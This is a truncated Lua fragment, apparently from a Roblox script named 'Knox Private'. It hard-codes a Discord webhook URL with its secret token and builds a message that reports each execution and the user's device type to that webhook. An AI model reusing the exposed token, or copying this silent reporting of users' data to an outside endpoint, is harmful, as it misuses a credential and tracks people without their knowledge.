...
local webh = "https://discord.com/api/webhooks/1142900104282513458/-VAryG9cLl9fZAneisxXH1oGgFFrkSeg2B6ENjpeLsGd_8lBrOux4lHgWMsWATaD2obz"
pcall(function()
    local deviceType = ""
    ...
    local data = {
        ['embeds'] = {
            {
                ['title'] = 'Knox Private',
                ['description'] = 'Knox Private has been executed!',
                ['fields'] = {
